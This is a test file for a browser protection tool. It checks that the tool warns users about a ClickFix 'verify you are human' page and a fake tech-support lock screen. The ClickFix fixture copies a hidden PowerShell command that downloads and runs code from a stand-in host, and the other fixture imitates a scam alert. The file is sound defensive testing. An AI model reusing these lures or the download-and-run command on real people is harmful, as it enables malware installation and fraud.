import { expect, serve, test } from './hooks.js'
import { expectBanner, expectSettled, settledCount, SETTLED } from './surfaces.js'

/**
 * SCN-008 and SCN-009 — the two traps that work on the person rather than the
 * browser.
 *
 * Both are asserted at the moment that matters: after the page has done the
 * thing (copied a command, taken the screen), and before the user has done the
 * thing it wants (paste it, call the number).
 */

const CLICKFIX = `<!doctype html>
<html><body>
  <h1>Verify you are human</h1>
  <p>Press Win + R, then Ctrl + V, then press Enter to complete verification.</p>
  <button id="verify">I am not a robot</button>
  <script>
    document.getElementById('verify').addEventListener('click', () => {
      const area = document.createElement('textarea')
      area.value = 'powershell -w hidden -c "iex(irm http://payload.test/a)"'
      document.body.append(area)
      area.select()
      document.execCommand('copy')
      area.remove()
    })
  </script>
</body></html>`

const TECHSUPPORT = `<!doctype html>
<html><body>
  <h1>SECURITY ALERT</h1>
  <p>Your computer has been locked. Windows Defender detected a trojan.
     Call technical support immediately on +1 (888) 555-0142. Do not restart your PC.</p>
  <script>document.documentElement.requestFullscreen?.().catch(() => {})</script>
</body></html>`

test('SCN-008 — the warning arrives before the user can click the fake control', async ({
  context,
}) => {
  // The best moment to warn is before the payload is on the clipboard, and the
  // wording alone is enough to know. The banner blocks, so the fake "I am not a
  // robot" button is not reachable through it — which is the protection.
  await serve(context, CLICKFIX)
  const page = await context.newPage()
  await page.goto('https://fixture.test/verify')

  await expectBanner(page, context)
  await expect(page.locator('okolos-banner [data-role=headline]')).toContainText(
    'run a command outside the browser',
  )
  await expect(page.locator('okolos-banner [data-role=detail]')).toContainText(
    'Nothing has been copied yet',
  )

  // The fake control is behind the blocking banner: the click does not reach it.
  await expect(page.locator('#verify').click({ timeout: 1500 })).rejects.toThrow(
    /intercepts pointer events/,
  )
})

test('SCN-008 — an ordinary page that copies for you is not accused', async ({ context }) => {
  await serve(
    context,
    `<!doctype html><html><body>
       <button id="c">Copy link</button>
       <script>
         document.getElementById('c').addEventListener('click', () => {
           const a = document.createElement('textarea')
           a.value = 'https://example.test/invite/abc'
           document.body.append(a); a.select(); document.execCommand('copy'); a.remove()
         })
       </script>
     </body></html>`,
  )
  const page = await context.newPage()
  await page.goto('https://fixture.test/share')
  // The first look at the page, then one more after the copy: the watcher judges every
  // copy, so "no warning" is asserted after that judgement rather than after a fixed wait
  // that under load ran out first (B-169).
  await expectSettled(page, SETTLED.trap)
  const looked = await settledCount(page, SETTLED.trap)
  await page.locator('#c').click()
  await expectSettled(page, SETTLED.trap, looked + 1)

  await expect(page.locator('okolos-banner')).toHaveCount(0)
})

test('SCN-009 — the fake lock is named as fake, with the number it wanted called', async ({
  context,
}) => {
  await serve(context, TECHSUPPORT)
  const page = await context.newPage()
  await page.goto('https://fixture.test/alert')

  await expectBanner(page, context)
  await expect(page.locator('okolos-banner [data-role=headline]')).toContainText('fake')
  await expect(page.locator('okolos-banner [data-role=detail]')).toContainText('888')
})
